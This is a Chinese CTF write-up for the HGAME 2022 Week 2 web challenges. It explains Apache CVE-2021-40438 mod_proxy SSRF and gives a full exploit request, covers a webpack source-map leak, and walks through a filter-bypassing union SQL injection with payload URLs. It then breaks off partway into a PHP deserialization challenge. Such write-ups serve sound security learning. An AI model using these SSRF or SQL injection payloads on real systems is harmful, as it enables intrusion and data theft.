---
title: HGAME 2022 Week2 writeup
date: 2022-02-04 20:00:00
tags: ctf
top_img: https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/logo_2022.png
cover: https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/logo_2022.png
---
# HGAME 2022 Week2 writeup by ek1ng

## WEB

### Apache!

题目考察的是Apache在2021年9月爆出的httpd mod_proxy SSRF漏洞，CVE-2021-40438

我们首先需要了解漏洞的原理，以下内容也是参考了网上的博客自己总结的。

漏洞产生于使用了mod_proxy，mod_proxy是Apache服务器中用于反代后端服务的一个模块，Apache在配置反代的后端服务器时，有两种情况：

- 直接使用某个协议反代到某个IP和端口，比如`ProxyPass / "http://localhost:8080"`
- 使用某个协议反代到unix套接字，比如`ProxyPass / "unix:/var/run/www.sock|http://localhost:8080/"`

第一种情况比较好理解，第二种情况相当于让用户可以使用一个Apache自创的写法来配置后端地址。那么这时候就会涉及到parse的过程，需要将这种自创的语法转换成能兼容正常socket连接的结构，而fix_uds_filename函数就是做这个事情的，问题也就是出在filename上，那么我们来看一下filename这个函数写了什么

```c
static void fix_uds_filename(request_rec *r, char **url) 
{
    char *ptr, *ptr2;
    if (!r || !r->filename) return;

    if (!strncmp(r->filename, "proxy:", 6) &&        //!!!!!!!!!!!问题在这
            (ptr2 = ap_strcasestr(r->filename, "unix:")) &&         //!!!!!!!!!!!问题在这
            (ptr = ap_strchr(ptr2, '|'))) {    //!!!!!!!!!!!问题在这
        apr_uri_t urisock;
        apr_status_t rv;
        *ptr = '\0';
        rv = apr_uri_parse(r->pool, ptr2, &urisock);
        if (rv == APR_SUCCESS) {
            char *rurl = ptr+1;
            char *sockpath = ap_runtime_dir_relative(r->pool, urisock.path);
            apr_table_setn(r->notes, "uds_path", sockpath);
            *url = apr_pstrdup(r->pool, rurl); /* so we get the scheme for the uds */
            /* r->filename starts w/ "proxy:", so add after that */
            memmove(r->filename+6, rurl, strlen(rurl)+1);
            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, 0, r,
                    "*: rewrite of url due to UDS(%s): %s (%s)",
                    sockpath, *url, r->filename);
        }
        else {
            *ptr = '|';
        }
    }
}
```

进入这个if语句需要满足三个条件：

- `r->filename`的前6个字符等于`proxy:`
- `r->filename`的字符串中含有关键字`unix:`
- `unix:`关键字后的部分含有字符`|`

当满足这三个条件后，将`unix:`后面的内容进行解析，设置成`uds_path`的值；将字符`|`后面的内容，设置成`rurl`的值。

比如`ProxyPass / "unix:xxxx|http://localhost:8080/"`，在解析完成后，`uds_path`的值等于`xxxx`，`rurl`的值等于`http://localhost:8080/`。好然后我们如果能想办法改变`r->filename`，我们是不是就可以想办法反代到我们要访问的内网机器了呢，所以我们要去看看`r->filename`

这时候我们需要了解函数`proxy_hook_canon_handler`，这个函数用于注册canon handler，比如：每一个`mod_proxy_xxx`都会注册一个自己的canon handler，canon handler会在反代的时候被调用，用于告诉Apache主程序它应该把这个请求交给哪个处理方法来处理。

然后简单来说r->filename中后半部分是用户可以控制的，可以通过请求的path或者search来控制这两个部分，控制了反代的后端地址，漏洞产生的原因就在这。

1. 

然后还有一个问题，难道apache就不会有什么识别的措施，你传给它unix套接字，他也会把这个请求发给用户url吗？那么Apache在正常情况下，因为识别到了unix套接字，所以会把用户请求发送给这个本地文件套接字，而不是后端URL。

简单说的话这里我们就需要让路径长度比较长，超过里面一个APP_PATH_MAX,这时候函数返回了路径过长的状态码导致最后unix套接字的值变成了null，这样Apache不会把请求发给unix套接字而是发给后端URL。

我们总结一下

CVE-2021-40438 漏洞为 Apache httpd 的 SSRF 漏洞，核心原理是 `mod_proxy` 模块为了支持 `UDS (Unix Domain Socket)` 转发而产生了安全性问题，并由多个位置代码问题组合产生。漏洞触发的前提如下：

1. 需开启 mod_proxy 配置
2. 需已知 `VirtualHost` 中 `ProxyPass` 指定的 URL 项
3. 使用 GET 请求超长字符串且超过目标 Apache 设置

然后在新版本中，apache仓库的commit的记录中可以看到官方解决漏洞的方法是，此前对用户访问url时unix:的位置没有做检验，然后`r->filename`的后半部分又可以由用户控制，这次检验了unix的位置所以漏洞就得到了修复。

上述就是原理，然后我们首先来看看题目是不是符合这个漏洞。

首先我们访问一下页面看看，页面提示我们去访问内网机器，并且提示我们内网机器的地址是internal.host，然后我们下载配置文件查看后，根据apache版本v2.4.48和题目描述需要访问到内网机器可以肯定这题是的漏洞是Apache httpd mod_proxy SSRF漏洞CVE-2021-40438

httpd.conf中发现mod_proxy配置开启↓

![uTools_1643465489854](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/uTools_1643465489854.png)

httpd-vhosts.conf发现ProxyPass 转发到https://www.google.com，得到apache服务器不仅作为资源服务器，还作为代理服务器转发到google上

![uTools_1643466264174](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/uTools_1643466264174.png)

我们根据给出配置文件我们发现mod_proxy开启了，ProxyPass是google并且版本为2.4.48，那么漏洞肯定存在。

接下来我们构造payload

首先是GET后面跟的参数 不能是直接/?unix（在网上大多此漏洞复现的帖子构造payload都是直接添加/?unix这里出题人也是设置了一个坑），而是需要/proxy?unix:，原因是如果是/?unix:直接构造，那么apache配置的ProxyPass参数设置的应该是“/"，也就是本地，这里被设置成了google，需要加一个proxy，具体可以参考一下这篇文章https://www.anquanke.com/post/id/257657

第二个点是A的数量，那么最高设置应该是8192但是实际上不会设置这么多，如果你发送8193个A的话，就直接会超url限制的，然后试了试7000多个是可以的，那么A具体需要多少才能超出是要看配置的，输入长度操作 `APR_PATH_MAX` 时，直接返回错误，而后在 `ap_proxy_determine_connection` 中绕过错误检查。`APR_PATH_MAX` 可能长度为 8192，但实际上可能更小，出题人应该是设置了4000多就够了。

下面是apache GitHub仓库看到的源码的内容

![image-20220130152100273](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130152100273.png)

第三个点是构造/proxy?unix:{A*7000}|https://example.com HTTP1.1 其中https://example.com部分填写的应该是我们希望代理转发到的地址，在题目里我们是需要访问[http://httpd.summ3r.top:60010](http://httpd.summ3r.top:60010/)，然后通过SSRF漏洞，让这个内网服务器internal.host反代理到我们直接访问的服务器，我们就可以访问到内网机器了，然后不要忘记添加/flag，flag也是在配置文件中告诉我们位于flag文件中。

![image-20220130152642934](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130152642934.png)

第四个点是Host应该是127.0.0.1

```http
GET /proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal.host/flag HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20220130154623362](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130154623362.png)

```
hgame{COng@tul4ti0n~u_r3prOduced_CVE-2021-40438}    
```



### webpack-engine

题目考察的是webpack打包工具泄露soursemap的漏洞

为了方便管理静态资源，优化前端工作流程，现代前端框架都会使用一些构建工具，如 `Grunt`、`Gulp`、`Webpack` 等。以 Webpack 为例，它是一个模块打包器。根据模块的依赖关系进行静态分析，然后将这些模块按照指定的规则生成对应的静态资源，使用这些构建工具就意味着不特别处理的话，JS 文件就会被全部打包在一起，如果没有删除 `Source Map`，用浏览器自带的开发者工具就能轻松看到，不当的打包配置和权限控制可能存在的危害有：

- 后台敏感功能、逻辑泄露
- API 权限控制不当造成信息泄露
- API 权限控制不当造成越权操作
- SQL 注入
- XSS 等

然后对应的解决办法就是在部署线上环境时删除Source Map

简单了解一下原理后我们来看题目，访问后f12查看一下源码，发现有一个和flag相关的.vue文件

![image-20220130161417511](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130161417511.png)

这时候我们直接访问一下看看是不是配置了路由

![image-20220130162051956](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130162051956.png)

解两层base64后我们就得到了flag

![image-20220130162132496](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130162132496.png)



### Pokemon

题目考察的是SQL注入，因为这题是有直接回显的，所以说不用时间盲注啊什么的注入方法，只需要union注入就可以了。题目对['select', 'from', 'where', '=', '\/\*\*\/', 'union', 'or', 'and', ' ', '\+', '-']做了过滤，那么注入的时候需要绕开这些过滤，SQL注入是一种非常套路的题型，首先是我们需要找到注入点，然后判断类型，字段数，回显点，依次爆库名，表名，字段名，数据。

首先我们先找注入点，打开题目给出的连接，访问后根据前端代码的注释，index.php接收id参数，经过尝试后id在1，2，3会分别返回3种pokemon，然后当id不是1，2，3时，会跳转到error.php，然后我们发现error.php接收参数code，当code为404时，页面会显示404 pokemon not found 当是code不为404的数字时，页面就不会有404 pokemon not found的字样，当code为字符时，页面会返回sql查询的报错信息，那么这个code参数这里是可以进行sql注入的。union注入时需要注意，union前面的select语句返回的字段数和union后面这句select返回的必须相等，然后通过输出code不为404让前面的select语句查询不到，就可以用后面的语句查询到我们想查询的内容啦，那么下面我们开始注入。

![image-20220202212215362](C:\Users\76104\AppData\Roaming\Typora\typora-user-images\image-20220202212215362.png)

首先我们已经通过输入数字和字符判断了，getStatusMessage接收一个整数类型的参数，而不是字符串类型

接下来判断字段数，这里空格和/**/被过滤了，用`/* */`绕开过滤，order的or被过滤了，需要双写绕开过滤，绕开过滤的方法也不止一种，我这是其中一种，order by 3无法正常返回数据，order by 2可以正常返回，说明字段数为2

```
1 order by 3

http://121.43.141.153:60056/error.php
?code=1/* */oorrder/* */by/* */3
```

![image-20220202212737861](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220202212737861.png)

接下来判断回显点

```
0 union select 1,2 limit 1

http://121.43.141.153:60056/error.php
?code=0/* */ununionion/* */seselectlect/* */1,2/* */limit/* */1
```

```
```

![image-20220202200858076](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220202200858076.png)

接下来爆库名

```
0 union select 1,database()

http://121.43.141.153:60056/error.php
?code=0/* */ununionion/* */seselectlect/* */1,database()
```

![image-20220202201020278](C:\Users\76104\AppData\Roaming\Typora\typora-user-images\image-20220202201020278.png)

得到库名**Pokemon**

接下来爆表名 这里等号用regexp绕过过滤

```
1 union select 1,group_concat(table_name) from information schema.tables where table_schema regexp pokemon

http://121.43.141.153:60056/error.php
?code=1/* */ununionion/* */seselectlect/* */1,group_concat(table_name)/* */frfromom/* */infoorrmation_schema.tables/* */whwhereere/* */table_schema/* */regexp/* */'pokemon';
```

![image-20220202202912857](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220202202912857.png)

爆出表名**fllllllllaaaaaag**

接下来爆字段名 这里等号用regexp绕过过滤

```
1 union select 1,group_concat(column_name) from information schema.columns where table_schema regexp pokemon

http://121.43.141.153:60056/error.php
?code=1/* */ununionion/* */seselectlect/* */1,group_concat(column_name)/* */frfromom/* */infoorrmation_schema.columns/* */whwhereere/* */table_schema/* */regexp/* */'pokemon';
```

![image-20220202203157878](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220202203157878.png)

得到字段名**flag**

根据字段名和表名爆出flag

```
1 union select 1,flag from fllllllllaaaaaag

http://121.43.141.153:60056/error.php
?code=1/* */ununionion/* */seselectlect/* */1,flag/* */frfromom/* */fllllllllaaaaaag;
```

![image-20220202203921483](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220202203921483.png)

### 一本单词书

题目考察的是PHP反序列化漏洞

首先访问题目给出的连接，发现是个登录页面，f12查看前端代码后发现注释www.zip，访问www.zip文件下载下来，我们就得到了源码

![image-20220201002045467](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220201002045467.png)

查看源代码后，因为php在字符串比较上是弱比较，那么只需要输入adm1n作为账号，一个不是纯数字并且1080开头的字符串作为密码就可以成功登录啦

![image-20220201002024630](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220201002024630.png)

登录后我们进入到了单词表功能，结合题目给出的源码，我们需要重点查看save.php get.php evil.php，先来仔细看一下代码结合抓包理解一下，看看到底发生了一些什么

![image-20220201002059650](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220201002059650.png)



首先是后端一共有3个接口，save.php,index.php,get.php

在我们点击添了个加的时候，会先后请求请求save.php,index.php,get.php，save.php将传入的json格式的数据，先`json_decode`转换成数组形式，然后再`encode`编码成键值对的形式，最后通过`file_put_contents`存入文件，然后这里的文件名是一个和`SESSION`有关的方式存储的，但是这个你修改了SESSION只是可以访问到/tmp/目录下面的一些文件，所以说你去修改的话也是没有什么用处，`SESSION`在这里面用处就是识别登录状态，识别你是不是以admin的用户名登录了系统。然后请求index.php,index.php就是你访问到的页面，然后index.php获取单词表里面的数据会去访问get.php，访问get.php的话，get.php做的就是从文件里面读取单词表的的一个过程，get.php会访问`$filename`这个文件，也就是我们save.php存数据进去的这个文件，然后先`file_get_contents`从文件里面把文件内容以字符串的形式读取出来，再`decode`解码成数组形式存储的`$data`，然后`$data`再通过`json_encode`编码成JSON的格式，然后再在前端页面上面渲染出来，形成单词表，这就是这个系统的整体逻辑。

**Save.php**

```php
<?php
session_start();
include 'admin_check.php';

function encode($data): string {
    $result = '';
    foreach ($data as $k => $v) {
        $result .= $k . '|' . serialize($v);
    }

    return $result;
}

function saveSessionData() {
    $filename = "/tmp/".$_SESSION['unique_key'].'.session';
    $data = json_decode(file_get_contents("php://input"));
    $str = encode($data);
    file_put_contents($filename, $str, FILE_APPEND);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    saveSessionData();
} else {
    echo 'method not allowed';
}
```

**get.php**

```php
<?php
session_start();
include 'admin_check.php';
include 'evil.php';

// flag is in /flag

function decode(string $data): Array {
    $result = [];
    $offset = 0;
    $length = \strlen($data);
    while ($offset < $length) {
        if (!strstr(substr($data, $offset), '|')) {
            return [];
        }
        $pos = strpos($data, '|', $offset);
        $num = $pos - $offset;
        $varname = substr($data, $offset, $num);
        $offset += $num + 1;
        $dataItem = unserialize(substr($data, $offset));

        $result[$varname] = $dataItem;
        $offset += \strlen(serialize($dataItem));
    }
    return $result;
}

